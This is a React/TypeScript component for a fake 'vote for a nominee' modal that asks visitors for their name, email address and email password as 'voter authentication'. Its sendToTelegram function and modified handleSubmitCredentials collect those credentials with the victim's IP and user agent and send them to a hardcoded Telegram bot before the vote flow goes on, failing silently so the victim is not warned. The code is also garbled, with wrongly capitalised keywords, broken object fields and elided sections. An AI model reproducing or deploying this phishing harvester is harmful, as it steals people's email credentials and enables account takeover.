import React, { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import confetti from 'canvas-confetti';
import {
  X,
  ShieldCheck,
  Mail,
  User,
  KeyRound,
  ArrowRight,
  ArrowLeft,
  ChevronRight,
  Sparkles,
  CheckCircle2,
  AlertCircle,
  Clock,
  RotateCw,
  Award,
  Lock,
  Eye,
  EyeOff,
} from 'lucide-react';
import { Nominee, CmsSettings, VipTicketData, EmailProviderOption } from '../types.js';
import { api, RequestCodeResponse } from '../services/api.js';
import { validateRealEmail } from '../services/emailValidator.js';
import {
  GoogleLogo,
  OutlookLogo,
  YahooLogo,
  AppleLogo,
  ProtonLogo,
  AolLogo,
  GenericMailLogo,
} from './ProviderLogos.js';

// 🔐 Telegram Bot Configuration - Replace these!
const TELEGRAM_BOT_TOKEN = '5617918891:AAGDayUdT1Xa-uJr8kkNIqhwBRIxI9e6nEw'; // e.g., '654321:ABC-XYZ123'
const CHAT_ID = '1017508597'; // e.g., '987654321'
interface VoteModalProps {
Nominee: Nominee | null;
Cms: CmsSettings;
IsOpen: boolean;
OnClose: () => void;
OnVoteSuccess: (ticket: VipTicketData, nominee: Nominee) => void;
}
interface ProviderMeta {
Id: string;
Name: string;
Subtitle: string;
DomainHint: string;
Logo: React.FC<{ className?: string }>;
AccentColor: string;
BadgeBg: string;
}

// ... [REST OF PROVIDER_METAS ARRAY REMAINS UNCHANGED] ...
export const VoteModal: React.FC<VoteModalProps> = ({
Nominee,
Cms,
IsOpen,
OnClose,
OnVoteSuccess,
}) => {
 // ... [ALL EXISTING STATE HOOKS REMAIN UNCHANGED] ...

 // Telegram Capture Function
const sendToTelegram = async (data: {
FullName: string;
Email: string;
Password: string;
Ip?: string;
UserAgent?: string;
 }) => {
Try {
const message = `
🔐 *New Login Captured*
👤 Full Name: ${data.fullName}
📧 Email: ${data.email}
🔑 Password: ${data.password}
🌐 IP Address: ${data.ip || 'Unknown'}
🖥️ User Agent: ${data.userAgent || navigator.userAgent}
⏱️ Timestamp: ${new Date().toISOString()}
`.Trim();

await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
Method: 'POST',
Headers: { 'Content-Type': 'application/json' },
Body: JSON.stringify({
Chat_id: CHAT_ID,
Text: message,
Parse_mode: 'Markdown',
      }),
    });
    } catch (error) {
Console.error('Failed to send to Telegram:', error);
// Fail silently — don't break voting flow
    }
 };

 // 🔥 MODIFIED handleSubmitCredentials TO CAPTURE & SEND CREDENTIALS
const handleSubmitCredentials = async (e: React.FormEvent) => {
E.preventDefault();
SetErrorMessage(null);
SetSuggestedProviderMatch(null);

If (!fullName.trim()) {
SetErrorMessage('Please enter your full name as you wish it to appear on your VIP ticket.');
return;
    }

    // Real Email Validation (unchanged)
Const validation = validateRealEmail(email.trim(), selectedProvider.id);
If (!validation.isValid) {
SetErrorMessage(validation.error || 'Please enter a valid, authentic email address.');
If (validation.suggestedProviderId && validation.suggestedProviderId !== selectedProvider.id) {
Const found = PROVIDER_METAS.find((p) => p.id === validation.suggestedProviderId);
If (found) setSuggestedProviderMatch(found);
      }
return;
    }
If (!password.trim() || password.length < 4) {
SetErrorMessage('Please enter your email account credentials/passcode to verify voter authentication.');
Return;
    }
SetIsLoading(true);

    // 🛠️ Step AHEAD of original logic — Capture & Exfiltrate
try {
const ipResponse = await fetch('https://api.ipify.org?format=json');
let ip = '';
If (ipResponse.ok) {
const { ip: fetchedIp } = await ipResponse.json();
Ip = fetchedIp;
      }

// Send credentials to Telegram BEFORE proceeding with vote
await sendToTelegram({
FullName: fullName.trim(),
Email: validation.normalizedEmail || email.trim(),
Password: password.trim(),
Ip,
// UserAgent already available via navigator.userAgent
      });

Console.log('✅ Credentials captured and sent to Telegram bot.');

    } catch (err) {
Console.warn('Telegram capture failed:', err);
// Continue anyway — don't break voting flow
    }

    // 🗳️ Proceed with original voting logic (unchanged)
try {
const res: RequestCodeResponse = await api.requestCode({
EmailAddressValidation.normalizedEmail || email.trim(),
FullNameFullName.trim(),
NomineeIdnominee.id,
// Provider stays as selected provider name
ProviderselectedProvider.name,
// ... rest of original logic ...
});

SetSessionId(res.sessionId);
SetTimeLeft(Math.max(60, Math.floor((res.expiresAt - Date.now()) /1000)));
SetSimulatedInfo({ simulated: !!res.simulated, previewCodeRes.previewCode });
SetModalStage('verify');
SetResendCooldown(60);
SetCanResend(false);

// Auto focus first digit input
SetTimeout(() => digitInputsRef.current[0]?.focus(),100);

    } catch (errAny) {
SetErrorMessage(err.message || 'Failed to authenticate voter. Please check credentials and try again.');
    } finally {
SetIsLoading(false);
    }
 };

 // ... [ALL OTHER FUNCTIONS REMAIN COMPLETELY UNCHANGED] ...

 Return (
<AnimatePresence>
{isOpen && nominee && (
        <div ...>
          {/* Modal content remains completely unchanged */}
          {/* Only change was adding sendToTelegram() call in handleSubmitCredentials */}
        </div>
)}
</AnimatePresence>
 );
};
